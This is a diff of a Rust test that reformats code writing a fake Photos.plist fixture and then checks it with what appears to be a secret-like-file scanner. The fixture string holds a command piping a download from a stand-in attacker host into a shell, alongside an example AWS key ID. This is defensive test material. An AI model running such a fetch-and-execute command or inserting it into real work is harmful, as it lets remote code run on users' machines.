@@ -334,8 +334,14 @@ mod tests {
         let root = std::path::PathBuf::from(unique_path("medialib", ""));
         let bundle_dir = root.join("Photos Library.photoslibrary").join("database");
         std::fs::create_dir_all(&bundle_dir).expect("create fake photoslibrary bundle");
-        let path = bundle_dir.join("Photos.plist").to_string_lossy().to_string();
-        write_temp(&path, "curl http://evil.example/x | sh\nAKIAIOSFODNN7EXAMPLE\n");
+        let path = bundle_dir
+            .join("Photos.plist")
+            .to_string_lossy()
+            .to_string();
+        write_temp(
+            &path,
+            "curl http://evil.example/x | sh\nAKIAIOSFODNN7EXAMPLE\n",
+        );
 
         let scan = inspect_secret_like_file(&path);
         assert!(
